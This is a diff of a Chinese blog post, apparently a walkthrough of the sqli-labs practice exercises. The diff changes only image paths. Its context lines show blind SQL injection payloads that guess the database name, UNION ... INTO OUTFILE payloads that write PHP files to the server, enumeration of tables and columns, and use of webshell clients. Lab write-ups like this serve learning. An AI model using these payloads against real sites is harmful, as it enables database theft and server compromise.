@@ -209,7 +209,7 @@
 </ul>
 <h2 id="法一-联合注入"><a href="#法一-联合注入" class="headerlink" title="法一:联合注入"></a>法一:联合注入</h2><h3 id="盲注猜解Less-5"><a href="#盲注猜解Less-5" class="headerlink" title="盲注猜解Less-5"></a>盲注猜解Less-5</h3><h4 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探:"></a>1.试探:</h4><p>插入<code>?id=1&#39;</code>报错，但未报错时页面并没有任何信息的回显；执行SQL语句后，若语句查询到匹配的数据会显示‘You are in……如果SQL语句没有查询到匹配的数据就不回显；如果语句有错误就显示错误的信息；故判断其为盲注。前四节都是通过闭合sql语句注入，这里只能通过数据库报错来获取想要的数据，原理：将group by与一个聚合函数一起使用，如count(*)，可以将想要查询的内容作为错误信息返回。</p>
 <h4 id="2-猜数据库名长度"><a href="#2-猜数据库名长度" class="headerlink" title="2.猜数据库名长度:"></a>2.<strong>猜数据库名长度</strong>:</h4><p><code>’ and length (database())=8--+</code>试到8时回显正常</p>
-<p><img src="/2020/11/09/sqli-labs/1-1604932103680.jpg" alt="1"></p>
+<p><img src="/2020/11/09/sqli-labs/1.jpg" alt="1"></p>
 <h4 id="3-猜库名："><a href="#3-猜库名：" class="headerlink" title="3.猜库名："></a>3.<strong>猜库名：</strong></h4><p><code>&#39; and left((select database()),1)=&#39;s&#39;--+</code>回显正常，再探寻第二个字母<code>&#39; and left((select database()),2)=&#39;sy&#39;--+</code>报错：</p>
 <p><img src="/2020/11/09/sqli-labs/3.jpg" alt="3"></p>
 <p>将y换成e后正常，依次推出八位数（经漫长的试探…….）得出库名security。security的十六进制=<strong>0x7365637572697479</strong></p>
@@ -241,7 +241,7 @@
 <p>打开：</p>
 <p><img src="/2020/11/09/sqli-labs/27.jpg" alt="27"></p>
 <p>也可以用菜刀：</p>
-<p><img src="/2020/11/09/sqli-labs/28-1605366582457.jpg" alt="28"></p>
+<p><img src="/2020/11/09/sqli-labs/28.jpg" alt="28"></p>
 <p>路径里的文件名一定要对，我刚开始下了菜刀，然后看了一个教程里面对文件命名为test.php;我自己命名为hhh.php，然后再编辑数据的时候输入了test.php……为此我还觉得是菜刀出了问题，然后下了蚁剑，还是不行，最后发现我的文件名错了！！!因为这个憨憨问题，我从13号晚上开始困惑了一天……</p>
 <h6 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h6><p>使用<code>?id=1&#39;)) union select 1,2,3 into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\test.php&quot;--+</code></p>
 <p>可以在目录下发现text.php文件</p>
@@ -250,7 +250,7 @@
 <p><code>union select 1,user(),database() into outfile D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\a.php&quot;</code><img src="/2020/11/09/sqli-labs/21.jpg" alt="21"></p>
 <p>爆表</p>
 <p><code>union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; into outfile</code></p>
-<p><img src="/2020/11/09/sqli-labs/22-1605341542750.jpg" alt="22"></p>
+<p><img src="/2020/11/09/sqli-labs/22.jpg" alt="22"></p>
 <p>爆字段</p>
 <p><code>union select 1,2,column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; into outfile</code><img src="/2020/11/09/sqli-labs/23.jpg" alt="23"></p>
 <p>爆值</p>
